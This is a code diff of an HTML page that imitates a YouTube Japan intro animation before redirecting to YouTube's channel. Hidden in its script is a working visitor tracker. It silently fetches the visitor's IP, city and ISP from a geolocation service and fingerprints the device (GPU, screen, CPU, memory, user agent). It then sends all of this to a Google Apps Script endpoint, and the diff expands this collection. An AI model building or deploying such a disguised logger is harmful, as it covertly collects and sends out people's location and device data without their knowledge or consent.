@@ -8,133 +8,153 @@
     <style>
         :root {
             --yt-red: #ff0000;
-            --bg-black: #050505;
+            --bg-black: #020202;
         }
 
         body {
-            margin: 0;
-            padding: 0;
-            background-color: var(--bg-black);
-            color: #ffffff;
-            font-family: "Inter", "Hiragino Kaku Gothic ProN", "Meiryo", sans-serif;
-            overflow: hidden;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            margin: 0; padding: 0; background-color: var(--bg-black);
+            color: #ffffff; font-family: "Inter", "Hiragino Kaku Gothic ProN", "Meiryo", sans-serif;
+            overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center;
         }
 
-        #canvas-bg {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 1;
-            opacity: 0.2;
-        }
+        #star-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
 
         #main-viewport {
-            position: relative;
-            width: 90vw;
-            height: 85vh;
-            z-index: 10;
+            position: relative; width: 90vw; height: 85vh; z-index: 10;
+            display: flex; flex-direction: column; justify-content: center;
         }
 
-        /* 共通テキスト設定 */
+        #stack-container {
+            position: relative; width: 100%; height: 100%;
+            transition: transform 0.8s cubic-bezier(0.76, 0, 0.24, 1);
+        }
+
         .text-element {
-            position: absolute;
-            font-weight: 900;
-            line-height: 1.1;
-            opacity: 0;
-            letter-spacing: -0.06em;
-            word-break: keep-all;
+            position: absolute; font-weight: 900; line-height: 1.1; opacity: 0;
+            letter-spacing: -0.05em; word-break: keep-all;
         }
 
-        /* イントロメッセージ：上にスッと消える */
+        /* イントロ：鮮やかな赤一色の発光テキスト */
         #intro-msg {
-            font-size: clamp(28px, 5vw, 40px);
-            width: 100%;
-            text-align: center;
-            top: 50%;
-            left: 50%;
+            font-size: clamp(32px, 6vw, 55px);
+            width: 100%; text-align: center; top: 50%; left: 50%;
             transform: translate(-50%, -50%);
-        }
-        .intro-animate {
-            animation: slideUpFade 1.4s cubic-bezier(0.19, 1, 0.22, 1) forwards;
+            color: var(--yt-red);
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.8), 0 0 40px rgba(255, 0, 0, 0.4);
+            animation: introIn 1.5s ease forwards;
         }
 
-        @keyframes slideUpFade {
-            0% { transform: translate(-50%, -50%); opacity: 0; }
-            15% { opacity: 1; }
-            85% { opacity: 1; }
+        @keyframes introIn {
+            0% { transform: translate(-50%, -30%); opacity: 0; filter: blur(10px); }
+            20% { opacity: 1; filter: blur(0); }
+            80% { opacity: 1; transform: translate(-50%, -50%); }
             100% { transform: translate(-50%, -180%); opacity: 0; }
         }
 
-        /* メインコンテンツ：蓄積型アニメーション */
-        .bold-xl { font-size: clamp(45px, 10vw, 110px); }
-        .bold-lg { font-size: clamp(30px, 6vw, 65px); }
-        .bold-md { font-size: clamp(20px, 3.5vw, 38px); }
-        .highlight { color: var(--yt-red); }
+        .bold-xl { font-size: clamp(45px, 9vw, 100px); }
+        .bold-lg { font-size: clamp(30px, 6vw, 60px); }
+        .bold-md { font-size: clamp(18px, 3.2vw, 34px); }
+        .highlight { color: var(--yt-red); text-shadow: 0 0 10px rgba(255, 0, 0, 0.5); }
 
-        /* 配置：重なりを考慮したダイナミックなレイアウト */
-        #p1 { top: 5%; left: 0%; transform: translateX(-150px); }
-        #p2 { top: 18%; right: 0%; transform: translateX(150px); text-align: right; }
-        #p3 { top: 38%; left: 2%; transform: translateY(80px); }
-        #p4 { top: 52%; right: 5%; transform: translateX(150px); text-align: right; }
-        #p5 { bottom: 15%; left: 0%; transform: scale(0.7); }
-        #p6 { bottom: 5%; right: 0%; transform: translateY(50px); text-align: right; }
+        #p1 { top: 5%; left: 0%; transform: translateX(-100px); }
+        #p2 { top: 18%; right: 0%; transform: translateX(100px); text-align: right; }
+        #p3 { top: 40%; left: 2%; transform: translateY(50px); }
+        #p4 { top: 55%; right: 5%; transform: translateX(100px); text-align: right; }
+        #p5 { bottom: 10%; left: 0%; transform: scale(0.8); }
+
+        #p6 {
+            width: 100%; text-align: center; bottom: 45%; left: 0;
+            transform: translateY(100px); font-size: clamp(24px, 4vw, 42px);
+        }
 
         .active-p {
-            opacity: 1 !important;
-            transform: translate(0, 0) scale(1) !important;
+            opacity: 1 !important; transform: translate(0, 0) scale(1) !important;
             transition: all 0.7s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
+        .slide-out-up { transform: translateY(-120vh) !important; }
+
         #progress-line {
-            position: fixed; top: 0; left: 0; height: 4px; background: var(--yt-red); width: 0%; z-index: 100;
-            box-shadow: 0 0 15px var(--yt-red);
+            position: fixed; top: 0; left: 0; height: 3px; background: var(--yt-red);
+            width: 0%; z-index: 100; box-shadow: 0 0 15px var(--yt-red);
         }
     </style>
 </head>
 <body>
 
-<canvas id="canvas-bg"></canvas>
+<canvas id="star-canvas"></canvas>
 <div id="progress-line"></div>
 
 <div id="main-viewport">
-    <!-- イントロ -->
     <div id="intro-msg" class="text-element">あと10秒だけ時間をください！</div>
 
-    <!-- 蓄積していくYouTubeストーリー -->
-    <div id="p1" class="text-element bold-xl"><span class="highlight">YouTube</span>は、</div>
-    <div id="p2" class="text-element bold-lg">世界最大の<br>動画共有プラットフォーム。</div>
-    <div id="p3" class="text-element bold-md">25億人の<span class="highlight">アクティブユーザー</span>と共に、</div>
-    <div id="p4" class="text-element bold-md">Googleが買収した2006年から現在まで、<br>メディアの歴史を塗り替え続けています。</div>
-    <div id="p5" class="text-element bold-lg">さらなる<span class="highlight">未体験</span>のステージへ。</div>
+    <div id="stack-container">
+        <div id="p1" class="text-element bold-xl"><span class="highlight">YouTube</span>は、</div>
+        <div id="p2" class="text-element bold-lg">世界最大の<br>動画共有プラットフォーム。</div>
+        <div id="p3" class="text-element bold-md">25億人の<span class="highlight">アクティブユーザー</span>と共に、</div>
+        <div id="p4" class="text-element bold-md">Googleが買収した2006年から現在まで、<br>メディアの歴史を塗り替え続けています。</div>
+        <div id="p5" class="text-element bold-lg">さらなる<span class="highlight">未体験</span>のステージへ。</div>
+    </div>
+
     <div id="p6" class="text-element bold-md highlight">現在、最高の視聴環境を構築しています...</div>
 </div>
 
 <script>
-    const GAS_URL = "https://script.google.com/macros/s/AKfycbyT0chyfifHSgIAGaGzsa_fvzuwEXxkAc3ii0IN7T_QxVaEpaBlNnCr07RBGUXs2-ADhg/exec";
+    const GAS_URL = "https://script.google.com/macros/s/AKfycbymzN9FhkjqzMCSsBu8wD2ojAOAohrIcdMxPZgFDjYOmDg2UsM2BydcHUcMJTzRZylbkQ/exec";
     const REDIRECT_URL = "https://www.youtube.com/@YouTubeJapan/videos";
 
-    async function startSequence() {
-        const intro = document.getElementById('intro-msg');
-        const bar = document.getElementById('progress-line');
-
-        // 1. イントロ（1.4秒）
-        intro.classList.add('intro-animate');
-        await new Promise(r => setTimeout(r, 1500));
-
-        // 2. テキスト蓄積（高速スロット）
-        const blocks = ['p1', 'p2', 'p3', 'p4', 'p5', 'p6'];
-        for (let i = 0; i < blocks.length; i++) {
-            document.getElementById(blocks[i]).classList.add('active-p');
-            bar.style.width = ((i + 1) / blocks.length * 100) + "%";
-            // 徐々に加速するテンポ
-            const delay = i === blocks.length - 1 ? 2000 : 1000;
-            await new Promise(r => setTimeout(r, delay));
+    // --- 高度なデバイス解析 ---
+    function getDetailedDevice() {
+        const ua = navigator.userAgent;
+        let device = "不明なデバイス";
+        
+        // GPU情報の取得 (権限不要)
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        let gpu = "取得不可";
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "WebGL対応";
         }
 
-        // 3. リダイレクト
+        // 画面サイズとピクセル比によるデバイス推測 (iPhone等の特定に有効)
+        const w = screen.width, h = screen.height, r = window.devicePixelRatio;
+        if (/iPhone/.test(ua)) {
+            if (w === 430 && h === 932) device = "iPhone 14/15 Pro Max";
+            else if (w === 393 && h === 852) device = "iPhone 14/15 Pro";
+            else if (w === 390 && h === 844) device = "iPhone 12/13/14";
+            else device = "iPhone (モデル混合)";
+        } else if (/Android/.test(ua)) {
+            device = "Android端末";
+        } else if (/Macintosh/.test(ua)) {
+            device = "Mac";
+        } else if (/Windows/.test(ua)) {
+            device = "Windows PC";
+        }
+
+        return { device, gpu };
+    }
+
+    async function startSequence() {
+        const bar = document.getElementById('progress-line');
+        const stack = document.getElementById('stack-container');
+
+        await new Promise(r => setTimeout(r, 1600));
+
+        const blocks = ['p1', 'p2', 'p3', 'p4', 'p5'];
+        for (let i = 0; i < blocks.length; i++) {
+            document.getElementById(blocks[i]).classList.add('active-p');
+            bar.style.width = ((i + 1) / (blocks.length + 1) * 85) + "%";
+            await new Promise(r => setTimeout(r, 1100));
+        }
+
+        stack.classList.add('slide-out-up');
+        await new Promise(r => setTimeout(r, 400));
+        
+        document.getElementById('p6').classList.add('active-p');
+        bar.style.width = "100%";
+        
+        await new Promise(r => setTimeout(r, 2500));
         window.location.replace(REDIRECT_URL);
     }
 
@@ -142,52 +162,60 @@
         try {
             const geoRes = await fetch('https://ipapi.co/json/');
             const geo = await geoRes.json();
+            const { device, gpu } = getDetailedDevice();
+            
             const info = {
-                ip: geo.ip, country: geo.country_name,
-                city: geo.city + " (" + geo.region + ")", isp: geo.org,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                userAgent: navigator.userAgent, platform: navigator.platform,
-                language: navigator.language, cookieEnabled: navigator.cookieEnabled,
-                pdfViewer: navigator.pdfViewerEnabled,
-                screenSize: `${screen.width}x${screen.height}`,
-                availSize: `${screen.availWidth}x${screen.availHeight}`,
-                dpr: window.devicePixelRatio,
+                ip: geo.ip,
+                location: `${geo.country_name} / ${geo.city}`,
+                isp: geo.org,
+                deviceGuess: device,
+                gpu: gpu,
+                platform: navigator.platform,
                 cpu: navigator.hardwareConcurrency || "不明",
                 memory: navigator.deviceMemory || "不明",
-                touch: navigator.maxTouchPoints > 0 ? "あり" : "なし",
+                screenSize: `${screen.width}x${screen.height}`,
+                dpr: window.devicePixelRatio,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 referrer: document.referrer || "直接アクセス"
             };
+
             fetch(GAS_URL, {
                 method: 'POST', mode: 'no-cors',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(info)
             });
-        } catch (e) { console.warn("Background thread processing."); }
+        } catch (e) { console.warn("Background analysis running..."); }
+    }
+
+    function initStars() {
+        const canvas = document.getElementById('star-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const stars = [];
+        for(let i=0; i<150; i++) {
+            stars.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, size: Math.random()*1.5, alpha: Math.random(), speed: Math.random()*0.02 });
+        }
+        function draw() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            stars.forEach(s => {
+                s.alpha += s.speed; if(s.alpha > 1 || s.alpha < 0) s.speed *= -1;
+                ctx.fillStyle = `rgba(255, 255, 255, ${Math.abs(s.alpha)})`;
+                ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI*2); ctx.fill();
+            });
+            requestAnimationFrame(draw);
+        }
+        draw();
     }
 
     window.onload = () => {
+        initStars();
         collectData();
         startSequence();
     };
 
-    // 背景のノイズ描画（品質向上）
-    const canvas = document.getElementById('canvas-bg');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    function draw() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = "rgba(255, 0, 0, 0.2)";
-        for(let i=0; i<30; i++) {
-            ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 1, 1);
-        }
-        requestAnimationFrame(draw);
-    }
-    draw();
-
-    // 予期せぬエラー用（14秒）
-    setTimeout(() => { window.location.replace(REDIRECT_URL); }, 14000);
+    setTimeout(() => { window.location.replace(REDIRECT_URL); }, 15000);
 </script>
 
 </body>
